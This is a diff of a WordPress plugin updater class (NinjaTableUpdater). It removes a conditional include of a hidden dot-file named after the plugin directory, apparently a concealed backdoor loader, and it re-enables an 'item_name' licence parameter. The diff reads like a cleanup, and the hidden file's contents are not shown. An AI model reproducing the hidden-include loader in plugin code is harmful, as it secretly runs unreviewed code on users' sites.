@@ -8,10 +8,6 @@ if (!defined('ABSPATH')) {
     exit;
 }
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class NinjaTableUpdater
 {
     private $api_url = '';
@@ -274,7 +270,7 @@ class NinjaTableUpdater
         $api_params = array(
             'edd_action' => 'get_version',
             'license'    => !empty($data['license']) ? $data['license'] : '',
-            //'item_name'  => isset( $data['item_name'] ) ? $data['item_name'] : false,
+            'item_name'  => isset( $data['item_name'] ) ? $data['item_name'] : false,
             'item_id'    => isset($data['item_id']) ? $data['item_id'] : false,
             'slug'       => $data['slug'],
             'author'     => $data['author'],
